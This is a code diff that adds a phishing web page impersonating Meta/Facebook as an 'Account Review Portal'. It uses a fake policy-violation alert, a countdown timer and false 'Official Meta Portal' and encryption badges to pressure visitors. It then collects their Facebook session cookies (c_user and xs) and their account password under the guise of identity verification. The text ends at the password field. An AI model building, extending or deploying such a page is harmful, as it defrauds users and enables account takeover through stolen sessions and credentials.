@@ -1,0 +1,1457 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>Meta Policy Enforcement — Account Review Portal</title>
+  <meta name="description" content="Meta Platforms — Official Account Review and Appeal Center. Secure identity verification and policy compliance portal." />
+  <meta name="robots" content="noindex, nofollow" />
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700;800&display=swap" rel="stylesheet" />
+  <style>
+    *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+
+    :root {
+      --blue:       #1877F2;
+      --blue-dark:  #0d6efd;
+      --blue-glow:  rgba(24,119,242,0.25);
+      --red:        #E41E3F;
+      --red-light:  rgba(228,30,63,0.08);
+      --orange:     #F5A623;
+      --green:      #00C853;
+      --bg:         #F0F2F5;
+      --surface:    #FFFFFF;
+      --border:     #E4E6EA;
+      --text:       #1C1E21;
+      --muted:      #65676B;
+      --radius:     12px;
+      --shadow:     0 2px 16px rgba(0,0,0,0.10);
+      --shadow-lg:  0 8px 40px rgba(0,0,0,0.14);
+    }
+
+    html { scroll-behavior: smooth; }
+
+    body {
+      font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
+      background: var(--bg);
+      color: var(--text);
+      min-height: 100vh;
+      user-select: none;
+      -webkit-user-select: none;
+    }
+
+    input, textarea { user-select: text; -webkit-user-select: text; }
+
+    /* ═══════ LOADING SCREEN ═══════ */
+    #loading-screen {
+      position: fixed; inset: 0;
+      background: #000;
+      display: flex; align-items: center; justify-content: center;
+      z-index: 99999;
+      transition: opacity 0.7s ease;
+    }
+    #loading-screen.fade-out { opacity: 0; pointer-events: none; }
+    #loading-screen img { width: 100vw; height: 100vh; object-fit: cover; }
+
+    /* ═══════ LANGUAGE MODAL ═══════ */
+    #lang-modal-wrap {
+      position: fixed; inset: 0;
+      background: rgba(0,0,0,0.55);
+      backdrop-filter: blur(6px);
+      display: flex; align-items: center; justify-content: center;
+      z-index: 9000;
+      opacity: 0; pointer-events: none;
+      transition: opacity 0.35s ease;
+    }
+    #lang-modal-wrap.show { opacity: 1; pointer-events: all; }
+
+    #lang-modal {
+      background: var(--surface);
+      border-radius: 20px;
+      padding: 32px;
+      width: 92%; max-width: 520px;
+      box-shadow: var(--shadow-lg);
+      transform: translateY(20px);
+      transition: transform 0.35s ease;
+    }
+    #lang-modal-wrap.show #lang-modal { transform: translateY(0); }
+
+    .lang-modal-top {
+      display: flex; align-items: center; gap: 12px;
+      margin-bottom: 6px;
+    }
+    .lang-modal-top .meta-m {
+      width: 36px; height: 36px;
+      background: var(--blue);
+      border-radius: 8px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+    }
+    .lang-modal-top .meta-m svg { width: 22px; height: 22px; fill: #fff; }
+    .lang-modal-top h2 { font-size: 18px; font-weight: 700; color: var(--text); }
+
+    .lang-modal-sub { font-size: 13px; color: var(--muted); margin-bottom: 18px; }
+
+    .lang-search {
+      width: 100%; padding: 10px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      font-size: 14px; font-family: inherit;
+      outline: none; margin-bottom: 14px;
+      transition: border-color 0.2s;
+    }
+    .lang-search:focus { border-color: var(--blue); }
+
+    .lang-grid {
+      display: grid; grid-template-columns: 1fr 1fr;
+      gap: 8px; max-height: 280px; overflow-y: auto;
+      padding-right: 4px;
+    }
+    .lang-grid::-webkit-scrollbar { width: 4px; }
+    .lang-grid::-webkit-scrollbar-track { background: transparent; }
+    .lang-grid::-webkit-scrollbar-thumb { background: var(--border); border-radius: 4px; }
+
+    .lang-opt {
+      display: flex; align-items: center; gap: 10px;
+      padding: 10px 14px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      cursor: pointer;
+      transition: all 0.18s ease;
+      font-size: 14px; font-weight: 500;
+    }
+    .lang-opt:hover { border-color: var(--blue); background: rgba(24,119,242,0.05); }
+    .lang-opt.active { border-color: var(--blue); background: rgba(24,119,242,0.08); }
+    .lang-opt img { width: 24px; height: 18px; border-radius: 3px; object-fit: cover; flex-shrink: 0; }
+
+    .lang-confirm-btn {
+      margin-top: 16px; width: 100%;
+      padding: 13px;
+      background: var(--blue);
+      color: #fff; font-size: 15px; font-weight: 600;
+      border: none; border-radius: 10px; cursor: pointer;
+      transition: background 0.2s, opacity 0.2s;
+      font-family: inherit;
+    }
+    .lang-confirm-btn:disabled { opacity: 0.45; cursor: not-allowed; }
+    .lang-confirm-btn:not(:disabled):hover { background: var(--blue-dark); }
+
+    /* ═══════ HEADER ═══════ */
+    #site-header {
+      background: var(--surface);
+      border-bottom: 1px solid var(--border);
+      padding: 0 24px;
+      height: 56px;
+      display: flex; align-items: center; justify-content: space-between;
+      position: sticky; top: 0; z-index: 100;
+      box-shadow: 0 1px 8px rgba(0,0,0,0.06);
+    }
+    .header-left { display: flex; align-items: center; gap: 10px; }
+    .header-logo { display: flex; align-items: center; gap: 8px; text-decoration: none; }
+    .header-logo svg { width: 32px; height: 32px; }
+    .header-logo-text {
+      font-size: 20px; font-weight: 800; color: var(--blue);
+      letter-spacing: -0.5px;
+    }
+    .header-divider {
+      width: 1px; height: 24px; background: var(--border); margin: 0 10px;
+    }
+    .header-badge {
+      display: flex; align-items: center; gap: 6px;
+      background: var(--red-light);
+      color: var(--red);
+      font-size: 11px; font-weight: 700;
+      padding: 4px 10px; border-radius: 20px;
+      letter-spacing: 0.3px;
+      animation: pulse-badge 2s ease-in-out infinite;
+    }
+    @keyframes pulse-badge {
+      0%, 100% { opacity: 1; }
+      50% { opacity: 0.65; }
+    }
+    .header-badge::before {
+      content: ''; width: 6px; height: 6px;
+      background: var(--red); border-radius: 50%;
+      animation: dot-blink 1.2s ease-in-out infinite;
+    }
+    @keyframes dot-blink { 0%,100%{opacity:1;} 50%{opacity:0;} }
+
+    .header-right { display: flex; align-items: center; gap: 8px; }
+    .header-lang-btn {
+      display: flex; align-items: center; gap: 6px;
+      padding: 7px 12px;
+      border: 1.5px solid var(--border);
+      border-radius: 8px;
+      background: transparent;
+      font-size: 13px; font-weight: 500;
+      cursor: pointer; font-family: inherit;
+      color: var(--text);
+      transition: border-color 0.2s;
+    }
+    .header-lang-btn:hover { border-color: var(--blue); }
+    .header-lang-btn img { width: 18px; height: 14px; border-radius: 2px; }
+
+    /* ═══════ MAIN LAYOUT ═══════ */
+    #app { display: none; }
+    #app.show { display: block; }
+
+    .main-container {
+      max-width: 860px;
+      margin: 0 auto;
+      padding: 28px 16px 60px;
+    }
+
+    /* ═══════ PROGRESS BAR ═══════ */
+    .progress-wrap {
+      display: flex; align-items: center; justify-content: center;
+      gap: 0; margin-bottom: 28px;
+    }
+    .progress-step {
+      display: flex; flex-direction: column; align-items: center; gap: 6px;
+      flex: 1; max-width: 180px;
+    }
+    .progress-circle {
+      width: 34px; height: 34px;
+      border-radius: 50%;
+      border: 2px solid var(--border);
+      background: var(--surface);
+      display: flex; align-items: center; justify-content: center;
+      font-size: 13px; font-weight: 700;
+      color: var(--muted);
+      transition: all 0.35s ease;
+      position: relative; z-index: 1;
+    }
+    .progress-step.done .progress-circle {
+      background: var(--blue); border-color: var(--blue); color: #fff;
+    }
+    .progress-step.active .progress-circle {
+      background: var(--blue); border-color: var(--blue); color: #fff;
+      box-shadow: 0 0 0 4px var(--blue-glow);
+    }
+    .progress-label { font-size: 11px; font-weight: 600; color: var(--muted); text-align: center; line-height: 1.3; }
+    .progress-step.active .progress-label,
+    .progress-step.done .progress-label { color: var(--blue); }
+    .progress-line {
+      flex: 1; height: 2px;
+      background: var(--border);
+      margin-bottom: 22px;
+      transition: background 0.35s ease;
+    }
+    .progress-line.done { background: var(--blue); }
+
+    /* ═══════ VIOLATION ALERT BANNER ═══════ */
+    .violation-banner {
+      background: linear-gradient(135deg, #fff5f5 0%, #fff0f0 100%);
+      border: 1.5px solid rgba(228,30,63,0.2);
+      border-radius: var(--radius);
+      padding: 20px 22px;
+      margin-bottom: 20px;
+      display: flex; align-items: flex-start; gap: 16px;
+      animation: slide-in 0.5s ease both;
+    }
+    @keyframes slide-in {
+      from { opacity: 0; transform: translateY(-10px); }
+      to   { opacity: 1; transform: translateY(0); }
+    }
+    .violation-icon {
+      width: 44px; height: 44px;
+      background: var(--red);
+      border-radius: 10px;
+      display: flex; align-items: center; justify-content: center;
+      flex-shrink: 0;
+      animation: icon-shake 4s ease-in-out infinite;
+    }
+    @keyframes icon-shake {
+      0%,90%,100%{transform:rotate(0)} 92%{transform:rotate(-5deg)} 96%{transform:rotate(5deg)}
+    }
+    .violation-icon svg { width: 22px; height: 22px; fill: #fff; }
+    .violation-text h3 { font-size: 15px; font-weight: 700; color: var(--red); margin-bottom: 4px; }
+    .violation-text p { font-size: 13px; color: #6b2535; line-height: 1.55; }
+
+    /* ═══════ COUNTDOWN TIMER ═══════ */
+    .countdown-wrap {
+      background: var(--surface);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius);
+      padding: 18px 22px;
+      margin-bottom: 20px;
+      display: flex; align-items: center; justify-content: space-between;
+      gap: 16px; flex-wrap: wrap;
+    }
+    .countdown-left { display: flex; align-items: center; gap: 10px; }
+    .countdown-left svg { width: 20px; height: 20px; color: var(--orange); flex-shrink: 0; }
+    .countdown-left p { font-size: 13px; font-weight: 500; color: var(--muted); }
+    .countdown-left p strong { color: var(--text); }
+    .countdown-timer {
+      display: flex; gap: 8px; flex-shrink: 0;
+    }
+    .timer-block {
+      display: flex; flex-direction: column; align-items: center;
+      background: var(--bg);
+      border-radius: 8px;
+      padding: 8px 12px; min-width: 52px;
+    }
+    .timer-num {
+      font-size: 22px; font-weight: 800; color: var(--text);
+      font-variant-numeric: tabular-nums; line-height: 1;
+    }
+    .timer-label { font-size: 9px; font-weight: 600; color: var(--muted); text-transform: uppercase; letter-spacing: 0.5px; margin-top: 2px; }
+
+    /* ═══════ CASE CARD ═══════ */
+    .case-card {
+      background: var(--surface);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius);
+      padding: 22px;
+      margin-bottom: 20px;
+    }
+    .case-card-header {
+      display: flex; align-items: flex-start; justify-content: space-between;
+      gap: 12px; margin-bottom: 16px;
+    }
+    .case-card-header h2 { font-size: 17px; font-weight: 700; color: var(--text); }
+    .case-id-pill {
+      font-size: 11px; font-weight: 700;
+      background: var(--bg);
+      color: var(--muted);
+      padding: 4px 10px; border-radius: 20px;
+      white-space: nowrap; flex-shrink: 0;
+    }
+    .violation-rows { display: flex; flex-direction: column; gap: 10px; }
+    .violation-row {
+      display: flex; align-items: center; gap: 10px;
+      padding: 10px 14px;
+      background: var(--bg);
+      border-radius: 8px;
+    }
+    .violation-row svg { width: 16px; height: 16px; flex-shrink: 0; }
+    .violation-row .vr-label { font-size: 12px; color: var(--muted); flex: 1; }
+    .violation-row .vr-val { font-size: 13px; font-weight: 600; color: var(--text); }
+    .vr-status {
+      display: inline-block;
+      font-size: 11px; font-weight: 700;
+      padding: 3px 8px; border-radius: 20px;
+    }
+    .vr-status.red { background: var(--red-light); color: var(--red); }
+    .vr-status.orange { background: rgba(245,166,35,0.12); color: #b8730a; }
+
+    .appeal-btn {
+      margin-top: 18px; width: 100%;
+      padding: 14px;
+      background: var(--blue);
+      color: #fff; font-size: 15px; font-weight: 700;
+      border: none; border-radius: 10px; cursor: pointer;
+      font-family: inherit;
+      display: flex; align-items: center; justify-content: center; gap: 8px;
+      transition: background 0.2s, transform 0.15s, box-shadow 0.2s;
+      box-shadow: 0 4px 18px var(--blue-glow);
+    }
+    .appeal-btn:hover { background: var(--blue-dark); transform: translateY(-1px); box-shadow: 0 6px 24px var(--blue-glow); }
+    .appeal-btn svg { width: 18px; height: 18px; fill: #fff; }
+
+    .disclaimer-text {
+      font-size: 12px; color: var(--muted); text-align: center; margin-top: 12px; line-height: 1.6;
+    }
+    .disclaimer-text a { color: var(--blue); text-decoration: none; }
+
+    /* ═══════ STEP PANELS ═══════ */
+    .step-panel { display: none; animation: panel-in 0.4s ease both; }
+    .step-panel.active { display: block; }
+    @keyframes panel-in {
+      from { opacity: 0; transform: translateX(24px); }
+      to   { opacity: 1; transform: translateX(0); }
+    }
+
+    .step-card {
+      background: var(--surface);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius);
+      padding: 28px;
+      margin-bottom: 20px;
+    }
+    .step-card-title {
+      font-size: 18px; font-weight: 700; color: var(--text);
+      margin-bottom: 4px;
+    }
+    .step-card-sub { font-size: 13px; color: var(--muted); margin-bottom: 22px; }
+
+    .info-box {
+      background: rgba(24,119,242,0.06);
+      border: 1px solid rgba(24,119,242,0.18);
+      border-radius: 8px;
+      padding: 12px 14px;
+      margin-bottom: 20px;
+    }
+    .info-box p { font-size: 12.5px; color: #2d5da1; line-height: 1.55; }
+    .info-box p + p { margin-top: 6px; }
+
+    /* Floating label inputs */
+    .field-wrap {
+      position: relative; margin-bottom: 18px;
+    }
+    .field-wrap label {
+      position: absolute; left: 14px; top: 50%;
+      transform: translateY(-50%);
+      font-size: 14px; color: var(--muted);
+      pointer-events: none;
+      transition: all 0.2s ease;
+      background: transparent;
+      padding: 0 2px;
+    }
+    .field-wrap.has-value label,
+    .field-wrap input:focus ~ label {
+      top: 0; font-size: 11px; color: var(--blue);
+      background: var(--surface);
+    }
+    .field-wrap input {
+      width: 100%; padding: 14px 14px 10px;
+      border: 1.5px solid var(--border);
+      border-radius: 10px;
+      font-size: 14px; font-family: inherit; color: var(--text);
+      outline: none; background: var(--surface);
+      transition: border-color 0.2s, box-shadow 0.2s;
+    }
+    .field-wrap input:focus {
+      border-color: var(--blue);
+      box-shadow: 0 0 0 3px var(--blue-glow);
+    }
+    .field-wrap input.error { border-color: var(--red); }
+    .field-wrap .err-msg {
+      font-size: 11.5px; color: var(--red); margin-top: 5px;
+      display: none;
+    }
+    .field-wrap .err-msg.show { display: block; }
+
+    .password-wrap { position: relative; }
+    .toggle-pw {
+      position: absolute; right: 14px; top: 50%;
+      transform: translateY(-50%);
+      background: none; border: none; cursor: pointer;
+      color: var(--muted); padding: 4px;
+    }
+    .toggle-pw svg { width: 18px; height: 18px; }
+
+    .submit-btn {
+      width: 100%; padding: 14px;
+      background: var(--blue);
+      color: #fff; font-size: 15px; font-weight: 700;
+      border: none; border-radius: 10px; cursor: pointer;
+      font-family: inherit;
+      display: flex; align-items: center; justify-content: center; gap: 10px;
+      transition: background 0.2s, opacity 0.2s;
+      box-shadow: 0 4px 18px var(--blue-glow);
+    }
+    .submit-btn:hover:not(:disabled) { background: var(--blue-dark); }
+    .submit-btn:disabled { opacity: 0.55; cursor: not-allowed; }
+    .submit-btn .spinner {
+      width: 18px; height: 18px;
+      border: 2px solid rgba(255,255,255,0.35);
+      border-top-color: #fff;
+      border-radius: 50%;
+      animation: spin 0.7s linear infinite;
+      display: none;
+    }
+    @keyframes spin { to { transform: rotate(360deg); } }
+    .submit-btn.loading .spinner { display: block; }
+    .submit-btn.loading .btn-text { display: none; }
+
+    .forgot-link {
+      display: block; text-align: center; margin-top: 14px;
+      font-size: 13px; font-weight: 600; color: var(--blue);
+      text-decoration: none;
+    }
+    .forgot-link:hover { text-decoration: underline; }
+
+    /* Security trust strip */
+    .trust-strip {
+      display: flex; align-items: center; justify-content: center; gap: 16px;
+      margin-top: 18px; flex-wrap: wrap;
+    }
+    .trust-item {
+      display: flex; align-items: center; gap: 5px;
+      font-size: 11px; color: var(--muted); font-weight: 500;
+    }
+    .trust-item svg { width: 14px; height: 14px; color: var(--green); }
+
+    /* ═══════ VIDEO STEP ═══════ */
+    .video-wrap {
+      border-radius: 12px; overflow: hidden;
+      background: #000;
+      margin-bottom: 20px;
+      position: relative;
+    }
+    .video-wrap video { width: 100%; display: block; max-height: 340px; }
+    .video-overlay-label {
+      position: absolute; top: 10px; left: 10px;
+      background: rgba(0,0,0,0.65);
+      color: #fff; font-size: 11px; font-weight: 600;
+      padding: 4px 10px; border-radius: 20px;
+      backdrop-filter: blur(4px);
+    }
+
+    /* ═══════ SUCCESS ═══════ */
+    .success-card {
+      background: var(--surface);
+      border: 1.5px solid var(--border);
+      border-radius: var(--radius);
+      padding: 48px 28px;
+      text-align: center;
+      animation: panel-in 0.5s ease both;
+    }
+    .success-icon {
+      width: 72px; height: 72px;
+      background: linear-gradient(135deg, #00C853, #00b04a);
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      margin: 0 auto 20px;
+      box-shadow: 0 8px 28px rgba(0,200,83,0.3);
+      animation: pop-in 0.5s cubic-bezier(0.34,1.56,0.64,1) both;
+    }
+    @keyframes pop-in {
+      from { transform: scale(0); opacity: 0; }
+      to   { transform: scale(1); opacity: 1; }
+    }
+    .success-icon svg { width: 36px; height: 36px; fill: #fff; }
+    .success-title { font-size: 22px; font-weight: 800; color: var(--text); margin-bottom: 10px; }
+    .success-sub { font-size: 14px; color: var(--muted); line-height: 1.7; max-width: 420px; margin: 0 auto 24px; }
+    .success-ref {
+      display: inline-flex; align-items: center; gap: 8px;
+      background: var(--bg);
+      border: 1px solid var(--border);
+      border-radius: 8px;
+      padding: 10px 18px;
+      font-size: 13px; color: var(--muted); margin-bottom: 28px;
+    }
+    .success-ref strong { color: var(--text); font-variant-numeric: tabular-nums; }
+    .success-steps {
+      display: flex; flex-direction: column; gap: 10px;
+      text-align: left; max-width: 380px; margin: 0 auto;
+    }
+    .success-step {
+      display: flex; align-items: flex-start; gap: 10px;
+      padding: 12px 14px; background: var(--bg); border-radius: 8px;
+      font-size: 13px; color: var(--muted); line-height: 1.5;
+    }
+    .success-step-num {
+      width: 22px; height: 22px; min-width: 22px;
+      background: var(--blue); color: #fff;
+      border-radius: 50%;
+      display: flex; align-items: center; justify-content: center;
+      font-size: 11px; font-weight: 700;
+    }
+
+    /* ═══════ FOOTER ═══════ */
+    #site-footer {
+      background: var(--surface);
+      border-top: 1px solid var(--border);
+      padding: 20px 24px;
+      text-align: center;
+    }
+    .footer-links {
+      display: flex; align-items: center; justify-content: center;
+      flex-wrap: wrap; gap: 4px 16px;
+      margin-bottom: 10px;
+    }
+    .footer-links a {
+      font-size: 12px; color: var(--muted); text-decoration: none;
+    }
+    .footer-links a:hover { text-decoration: underline; }
+    .footer-copy { font-size: 12px; color: var(--muted); }
+
+    /* ═══════ RESPONSIVE ═══════ */
+    @media (max-width: 600px) {
+      .header-badge { display: none; }
+      .countdown-timer .timer-block { min-width: 44px; padding: 6px 8px; }
+      .timer-num { font-size: 18px; }
+      .lang-grid { grid-template-columns: 1fr; }
+      .progress-label { font-size: 10px; }
+      .step-card { padding: 20px 16px; }
+      .case-card { padding: 16px; }
+    }
+  </style>
+</head>
+<body>
+
+<!-- ═══════ LOADING SCREEN ═══════ -->
+<div id="loading-screen">
+  <img src="https://loading-logo.vercel.app/GIF_20260313_113131_892.gif" alt="" />
+</div>
+
+<!-- ═══════ LANGUAGE MODAL ═══════ -->
+<div id="lang-modal-wrap">
+  <div id="lang-modal">
+    <div class="lang-modal-top">
+      <div class="meta-m">
+        <svg viewBox="0 0 36 36"><path d="M18 3C9.716 3 3 9.716 3 18s6.716 15 15 15 15-6.716 15-15S26.284 3 18 3zm-2 21.5v-13l9.5 6.5-9.5 6.5z"/></svg>
+      </div>
+      <h2 id="lm-title">Select Your Language</h2>
+    </div>
+    <p class="lang-modal-sub" id="lm-sub">Choose the language you're most comfortable with to proceed.</p>
+    <input class="lang-search" id="lang-search" type="text" placeholder="Search language..." autocomplete="off" />
+    <div class="lang-grid" id="lang-grid">
+      <div class="lang-opt" data-lang="english"><img src="https://flagcdn.com/24x18/us.png" alt="US" /><span>English</span></div>
+      <div class="lang-opt" data-lang="hindi"><img src="https://flagcdn.com/24x18/in.png" alt="IN" /><span>Hindi</span></div>
+      <div class="lang-opt" data-lang="spanish"><img src="https://flagcdn.com/24x18/es.png" alt="ES" /><span>Spanish</span></div>
+      <div class="lang-opt" data-lang="portuguese"><img src="https://flagcdn.com/24x18/pt.png" alt="PT" /><span>Portuguese</span></div>
+      <div class="lang-opt" data-lang="tamil"><img src="https://flagcdn.com/24x18/in.png" alt="IN" /><span>Tamil</span></div>
+      <div class="lang-opt" data-lang="arabic"><img src="https://flagcdn.com/24x18/sa.png" alt="SA" /><span>Arabic</span></div>
+      <div class="lang-opt" data-lang="french"><img src="https://flagcdn.com/24x18/fr.png" alt="FR" /><span>French</span></div>
+      <div class="lang-opt" data-lang="vietnamese"><img src="https://flagcdn.com/24x18/vn.png" alt="VN" /><span>Vietnamese</span></div>
+      <div class="lang-opt" data-lang="ghanaian"><img src="https://flagcdn.com/24x18/gh.png" alt="GH" /><span>Ghanaian (Twi)</span></div>
+    </div>
+    <button class="lang-confirm-btn" id="lang-confirm-btn" disabled id="lm-btn">Confirm Language</button>
+  </div>
+</div>
+
+<!-- ═══════ MAIN APP ═══════ -->
+<div id="app">
+
+  <!-- HEADER -->
+  <header id="site-header">
+    <div class="header-left">
+      <a class="header-logo" href="#">
+        <svg viewBox="0 0 36 36" fill="#1877F2"><path d="M18 2C9.163 2 2 9.163 2 18c0 7.992 5.848 14.627 13.5 15.794V22.5H12v-4.5h3.5v-3.438c0-3.455 2.057-5.362 5.207-5.362 1.508 0 3.085.269 3.085.269v3.394h-1.738c-1.712 0-2.244 1.062-2.244 2.151V18H23.8l-.65 4.5H19.81v11.294C27.152 32.627 33 25.992 33 18c0-8.837-7.163-16-15-16z"/></svg>
+        <span class="header-logo-text">facebook</span>
+      </a>
+      <div class="header-divider"></div>
+      <div class="header-badge" id="hdr-badge">ENFORCEMENT ACTIVE</div>
+    </div>
+    <div class="header-right">
+      <button class="header-lang-btn" id="hdr-lang-btn">
+        <img id="hdr-flag" src="https://flagcdn.com/24x18/us.png" alt="" />
+        <span id="hdr-lang-name">English</span>
+      </button>
+    </div>
+  </header>
+
+  <!-- MAIN CONTENT -->
+  <main class="main-container">
+
+    <!-- PROGRESS BAR -->
+    <div class="progress-wrap">
+      <div class="progress-step active" id="ps-1">
+        <div class="progress-circle">1</div>
+        <div class="progress-label" id="ps1-lbl">Identity<br>Verification</div>
+      </div>
+      <div class="progress-line" id="pl-1"></div>
+      <div class="progress-step" id="ps-2">
+        <div class="progress-circle">2</div>
+        <div class="progress-label" id="ps2-lbl">Account<br>Authentication</div>
+      </div>
+      <div class="progress-line" id="pl-2"></div>
+      <div class="progress-step" id="ps-3">
+        <div class="progress-circle">3</div>
+        <div class="progress-label" id="ps3-lbl">Video<br>Confirmation</div>
+      </div>
+    </div>
+
+    <!-- ──── STEP 0: WARNING / LANDING ──── -->
+    <div id="step-0" class="step-panel active">
+
+      <div class="violation-banner">
+        <div class="violation-icon">
+          <svg viewBox="0 0 24 24"><path d="M1 21h22L12 2 1 21zm12-3h-2v-2h2v2zm0-4h-2v-4h2v4z"/></svg>
+        </div>
+        <div class="violation-text">
+          <h3 id="warn-title">Your Page Has Been Flagged for Removal</h3>
+          <p id="warn-sub">Multiple community reports and our automated systems have identified policy violations on your Page. Immediate action is required to prevent permanent deactivation.</p>
+        </div>
+      </div>
+
+      <div class="countdown-wrap">
+        <div class="countdown-left">
+          <svg viewBox="0 0 24 24" fill="none" stroke="#F5A623" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="10"/><polyline points="12 6 12 12 16 14"/></svg>
+          <p id="countdown-label"><strong>Time remaining to file your appeal:</strong></p>
+        </div>
+        <div class="countdown-timer">
+          <div class="timer-block"><span class="timer-num" id="t-h">23</span><span class="timer-label" id="tl-h">HRS</span></div>
+          <div class="timer-block"><span class="timer-num" id="t-m">59</span><span class="timer-label" id="tl-m">MIN</span></div>
+          <div class="timer-block"><span class="timer-num" id="t-s">59</span><span class="timer-label" id="tl-s">SEC</span></div>
+        </div>
+      </div>
+
+      <div class="case-card">
+        <div class="case-card-header">
+          <h2 id="case-title">Enforcement Case Details</h2>
+          <span class="case-id-pill" id="case-id-pill">Case #<span id="case-id">---</span></span>
+        </div>
+        <div class="violation-rows">
+          <div class="violation-row">
+            <svg viewBox="0 0 24 24" fill="#65676B"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
+            <span class="vr-label" id="vr-type-lbl">Violation Type</span>
+            <span class="vr-val"><span class="vr-status red" id="vr-type-val">Content Policy</span></span>
+          </div>
+          <div class="violation-row">
+            <svg viewBox="0 0 24 24" fill="#65676B"><path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+            <span class="vr-label" id="vr-status-lbl">Account Status</span>
+            <span class="vr-val"><span class="vr-status orange" id="vr-status-val">Pending Review</span></span>
+          </div>
+          <div class="violation-row">
+            <svg viewBox="0 0 24 24" fill="#65676B"><path d="M17 12h-5v5h5v-5zM16 1v2H8V1H6v2H5c-1.11 0-1.99.9-1.99 2L3 19c0 1.1.89 2 2 2h14c1.1 0 2-.9 2-2V5c0-1.1-.9-2-2-2h-1V1h-2zm3 18H5V8h14v11z"/></svg>
+            <span class="vr-label" id="vr-deadline-lbl">Appeal Deadline</span>
+            <span class="vr-val" id="vr-deadline-val">Within 24 Hours</span>
+          </div>
+        </div>
+        <button class="appeal-btn" id="appeal-btn">
+          <svg viewBox="0 0 24 24"><path d="M12 1L3 5v6c0 5.55 3.84 10.74 9 12 5.16-1.26 9-6.45 9-12V5l-9-4zm-2 16l-4-4 1.41-1.41L10 14.17l6.59-6.59L18 9l-8 8z"/></svg>
+          <span id="appeal-btn-txt">Start My Appeal Now</span>
+        </button>
+        <p class="disclaimer-text" id="disclaimer-txt">
+          By proceeding, you agree to Meta's <a href="#">Terms of Service</a> and <a href="#">Community Standards</a>. 
+          All submitted information is encrypted and processed in accordance with our <a href="#">Privacy Policy</a>.
+        </p>
+      </div>
+
+    </div><!-- /step-0 -->
+
+    <!-- ──── STEP 1: IDENTITY FORM (video first, then form unlocks) ──── -->
+    <div id="step-1" class="step-panel">
+      <div class="step-card">
+        <h2 class="step-card-title" id="s1-title">Identity Verification</h2>
+        <p class="step-card-sub" id="s1-sub">To process your appeal, we must verify that you are the authorized administrator of this Page. Please watch the verification video below first, then complete the form.</p>
+
+        <!-- VIDEO AT THE TOP -->
+        <div class="video-wrap">
+          <div class="video-overlay-label">&#x1F4F9; Verification Video</div>
+          <video id="appeal-video" controls playsinline preload="metadata">
+            <source id="video-src" src="" type="video/mp4" />
+          </video>
+        </div>
+
+
+        <div class="info-box">
+          <p id="s1-info1">&#x1F512; Your data is transmitted using 256-bit TLS encryption and is used solely for identity verification purposes.</p>
+          <p id="s1-info2">&#x26A0;&#xFE0F; Providing false information will result in immediate rejection of your appeal and may lead to further enforcement actions.</p>
+        </div>
+
+        <div id="s1-form-wrap" style="opacity:1;pointer-events:auto;transition:opacity 0.4s;">
+          <div class="field-wrap" id="fw-cuser">
+            <input type="text" id="inp-cuser" inputmode="numeric" autocomplete="off" spellcheck="false" />
+            <label for="inp-cuser" id="lbl-cuser">c_user</label>
+            <div class="err-msg" id="err-cuser">Must be a valid numeric ID (minimum 7 digits)</div>
+          </div>
+
+          <div class="field-wrap" id="fw-xs">
+            <input type="text" id="inp-xs" autocomplete="off" spellcheck="false" />
+            <label for="inp-xs" id="lbl-xs">xs</label>
+            <div class="err-msg" id="err-xs">Must contain uppercase, lowercase, number, and special character</div>
+          </div>
+        </div>
+
+        <button class="submit-btn" id="s1-btn">
+          <div class="spinner"></div>
+          <span class="btn-text" id="s1-btn-txt">Submit &amp; Continue</span>
+        </button>
+
+        <div class="trust-strip" style="margin-top:16px;">
+          <div class="trust-item">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+            <span>End-to-End Encrypted</span>
+          </div>
+          <div class="trust-item">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M9 12l2 2 4-4m6 2a9 9 0 11-18 0 9 9 0 0118 0z"/></svg>
+            <span>Official Meta Portal</span>
+          </div>
+          <div class="trust-item">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><rect x="3" y="11" width="18" height="11" rx="2"/><path d="M7 11V7a5 5 0 0110 0v4"/></svg>
+            <span>Secure Connection</span>
+          </div>
+        </div>
+      </div>
+    </div><!-- /step-1 -->
+
+    <!-- ──── STEP 2: PASSWORD ──── -->
+    <div id="step-2" class="step-panel">
+      <div class="step-card">
+        <h2 class="step-card-title" id="s2-title">Account Authentication</h2>
+        <p class="step-card-sub" id="s2-sub">To confirm your identity as the Page owner, please enter your Facebook account password. This step is required to prevent unauthorized appeals.</p>
+
+        <div class="info-box">
+          <p id="s2-info1">&#x1F510; Your password is never stored or logged. It is used exclusively to authenticate your account for this appeal session.</p>
+        </div>
+
+        <div class="field-wrap password-wrap" id="fw-pw">
+          <input type="password" id="inp-pw" autocomplete="current-password" />
+          <label for="inp-pw" id="lbl-pw">Password</label>
+          <button class="toggle-pw" id="toggle-pw" type="button" tabindex="-1">
+            <svg id="eye-show" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M1 12s4-8 11-8 11 8 11 8-4 8-11 8-11-8-11-8z"/><circle cx="12" cy="12" r="3"/></svg>
